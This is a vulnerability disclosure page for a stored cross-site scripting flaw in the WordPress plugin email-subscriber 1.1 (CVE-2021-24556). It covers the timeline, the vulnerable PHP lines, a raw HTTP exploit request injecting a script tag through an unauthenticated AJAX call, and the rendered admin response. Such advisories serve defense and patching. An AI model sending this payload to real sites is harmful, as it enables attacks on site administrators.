<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
      <title>wp-plugin : email-subscriber | Code Vigilant : to err is human.. To fix is Humanity</title>
    
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
<a href="https://codevigilant.com"><img src="/banner.png" class="header-image" width="508" height="111" alt=""  /></a>

<nav class="menu">
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/" >
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item menu__dropdown">
			<a class="menu__link" href="/disclosure/">
				
				<span class="menu__text">Disclosure</span>

				
			</a>
			<input type="checkbox" id="Disclosure">
			<ul class="submenu__list">
				
					<li class="menu__item">
					<a class="menu__link" href="/category/injection/">
						
						<span class="menu__text">INJECTION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/cross-site-scripting-xss/">
						
						<span class="menu__text">CROSS-SITE SCRIPTING (XSS)</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/information-disclosure/">
						
						<span class="menu__text">INFORMATION DISCLOSURE</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/local-file-inclusion/">
						
						<span class="menu__text">LOCAL FILE INCLUSION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/ssrf/">
						
						<span class="menu__text">SSRF/XSPA</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/components-with-known-vulnerabilities/">
						
						<span class="menu__text">COMPONENTS WITH KNOWN VULNERABILITIES</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/unvalidated-redirects-and-forwards/">
						
						<span class="menu__text">UNVALIDATED REDIRECTS AND FORWARDS</span>
						
					</a>
					</li>
				
			</ul>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/blog/" >
				
				<span class="menu__text">Blog</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/feed.xml" >
				
				<span class="menu__text">RSS Feed</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about-team/" >
				
				<span class="menu__text">About Team</span>
				
			</a>
		</li>
	</ul>
</nav>



<main>
	<br />
<center><a href=""><span class="title">Wp Plugin Email Subscriber</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/email-subscriber/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : email-subscriber</a></div>
<div>Effected Version : 1.1 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/cross-site-scripting-xss/">Cross-Site Scripting (XSS)</a></div>
<div>Minimum Level of Access Required : Unauthenticated</div>
<div>CVE Number : CVE-2021-24556</div>
<div>Identified by : <a href="/author/shreya_pohekar/">Shreya Pohekar</a></div>
<div><a href="https://wpscan.com/plugin/email-subscriber/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>May 14, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	<li>
	May 19, 2021 : Plugin  Closed</li>
	
	
	<li>July 20, 2021 : CVE Assigned</li>
	
	<li>July 23, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<p>The ajax request takes in <code>subscribe_email</code> and <code>subscribe_name</code> as the post parameter and inserts it into the sql statement without properly sanitising, validating or escaping parameters. The unsanitised input gets stored in the database. When the admin user opens the <a href="http://172.28.128.50/wp-admin/edit.php?post_type=kes_campaign&amp;page=kento_email_subscriber_list_settings" target="_blank" rel="noreferrer noopener nofollow">subscriber list</a>
, the unsanitised stored input is loaded in table and XSS is triggerred.</p>
<p>Vulnerable Code: <a href="https://plugins.trac.wordpress.org/browser/email-subscriber/trunk/kento-email-subscribers-list.php#L61" target="_blank" rel="noreferrer noopener nofollow">kento-email-subscribers-list.php#L61</a>
</p>
<pre><code>60:               &lt;td&gt;&lt;a href='mailto:&lt;?php echo $entry-&gt;email; ?&gt;'&gt;&lt;?php echo $entry-&gt;email; ?&gt;&lt;/a&gt;&lt;/td&gt;  
61:                &lt;td&gt;&lt;?php echo $entry-&gt;name; ?&gt;&lt;/td&gt;
62:                &lt;td&gt;&lt;?php echo &quot;&lt;span data-id='&quot;.$entry-&gt;id.&quot;' 

</code></pre><h4 id="poc-screenshot">PoC Screenshot</h4>
<p><img src="/disclosure_screenshots/email-subscriber-poc.png" alt="PoC Screenshot"></p>
<h4 id="exploit">Exploit</h4>
<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 172.28.128.50
Content-Length: 117
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://172.28.128.50
Referer: http://172.28.128.50/2021/04/28/fgf/?preview=true
Accept-Language: en-US,en;q=0.9
Connection: close

action=kento_email_subscriber_ajax&amp;subscribe_email=&lt;script&gt;alert(1)&lt;/script&gt;&amp;subscribe_name=&lt;script&gt;alert(1)&lt;/script&gt;

</code></pre><h4 id="response">Response</h4>
<p>Response when subscriber list is loaded by admin</p>
<pre><code>            &lt;tr class=&quot; row_id_8&quot;&gt;
            &lt;!--
                &lt;td&gt;&lt;input type='checkbox' value='8' /&gt;&lt;/td&gt;
                --&gt;
                &lt;td&gt;&lt;a href='mailto:&lt;script&gt;alert(1)&lt;/script&gt;'&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/a&gt;&lt;/td&gt;  
                &lt;td&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/td&gt;
                &lt;td&gt;&lt;span data-id='8' class='kento_subscribe_delete kento_subscribe_delete_8'&gt;&lt;/span&gt;                &lt;/td&gt;
            &lt;/tr&gt;
 
             
            &lt;tr class=&quot;alternate row_id_7&quot;&gt;
            &lt;!--
                &lt;td&gt;&lt;input type='checkbox' value='7' /&gt;&lt;/td&gt;
                --&gt;
                &lt;td&gt;&lt;a href='mailto:fdg'&gt;fdg&lt;/a&gt;&lt;/td&gt;  
                &lt;td&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/td&gt;
                &lt;td&gt;&lt;span data-id='7' class='kento_subscribe_delete kento_subscribe_delete_7'&gt;&lt;/span&gt;                &lt;/td&gt;
            &lt;/tr&gt;
 
             
            &lt;tr class=&quot;alternate row_id_3&quot;&gt;

</code></pre>

<br />


</main>

  <footer>
  
  
  <hr/>
  Â© <a href="https://anantshri.info">Anant Shrivastava</a> 2021
  
  </footer>
  </body>
</html>

